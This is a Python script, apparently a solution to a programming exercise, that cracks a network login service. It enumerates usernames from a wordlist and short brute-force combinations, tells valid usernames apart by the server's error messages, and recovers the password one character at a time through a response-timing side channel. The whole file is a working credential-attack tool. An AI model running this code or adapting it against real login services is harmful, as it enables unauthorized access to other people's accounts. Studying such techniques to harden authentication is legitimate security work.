import socket
import argparse
from string import ascii_lowercase
from string import ascii_letters
from itertools import combinations
from itertools import product
import json
from datetime import datetime

class PasswordHacker:
    def __init__(self):
        self.success = "Connection success!"
        self.no_attempts = "Too many attempts"
        self.wrong_password = "Wrong password!"
        self.wrong_login = "Wrong login!"
        self.messages = [
            self.success,
            self.no_attempts,
            self.wrong_password,
            self.wrong_login,
        ]
        self.form = {}

    def __enter__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("host", type=str)
        parser.add_argument("port", type=int)
        self.args = parser.parse_args()
        self.sock = socket.socket()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.sock.close()

    def __get_all_digits(self):
        return "".join([str(i) for i in range(10)])

    def get_letters(self, maximum, start):
        characters = list(self.__get_all_digits() + ascii_lowercase)
        count = 1
        while count <= maximum:
            passwords = combinations(characters, count)
            for password in passwords:
                yield start + "".join(password)
            count += 1

    def get_letters_for_login(self):
        return self.get_letters(3, "")

    def get_letters_for_password(self):
        return list(ascii_letters + self.__get_all_digits())

    def __connect(self):
        self.sock.connect((self.args.host, int(self.args.port)))

    def __get_combinations(self, password):
        combs = list(map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in password))))
        for comb in combs:
            yield comb

    def __get_typical(self, filename):
        passwords = []
        with open(filename, "r") as password_list:
            for p in password_list.readlines():
                passwords.append(p.rstrip("\n"))
        for password in passwords:
            combinating = list(self.__get_combinations(password))
            for comb in combinating:
                yield comb

    def main(self):
        self.__connect()
        login = self.hack_login()
        auth = self.hack_password(login)
        print(json.dumps(auth))

    def get_result(self):
        return json.loads(self.sock.recv(1024).decode("utf-8"))["result"]

    def send(self, what):
        self.sock.send(what.encode())
        return self.get_result()

    def send_form(self, login, password):
        self.form = {
            "login": login,
            "password": password
        }
        auth = json.dumps(self.form)
        self.sock.send(auth.encode())
        message = self.get_result()
        if message not in self.messages:
            raise ValueError(message, self.form)
        return message

    def hack_login(self):
        typical_logins = self.__get_typical("logins.txt")
        for login in typical_logins:
            if self.send_form(login, " ") == self.wrong_password:
                return login
        all_logins = self.get_letters_for_login()
        for login in all_logins:
            if self.send_form(login, " ") == self.wrong_password:
                return login
        raise ValueError("I can't find the login.")

    def hack_password(self, login, now=""):
        for letter in self.get_letters_for_password():
            password = now + letter
            start = datetime.now()
            message = self.send_form(login, password)
            finish = datetime.now()
            difference = finish - start
            if message == self.success:
                return self.form
            if message == self.wrong_password and difference.total_seconds() >= 0.1:
                return self.hack_password(login, password)
        raise ValueError("I can't find the password")


if __name__ == '__main__':
    with PasswordHacker() as ph:
        ph.main()
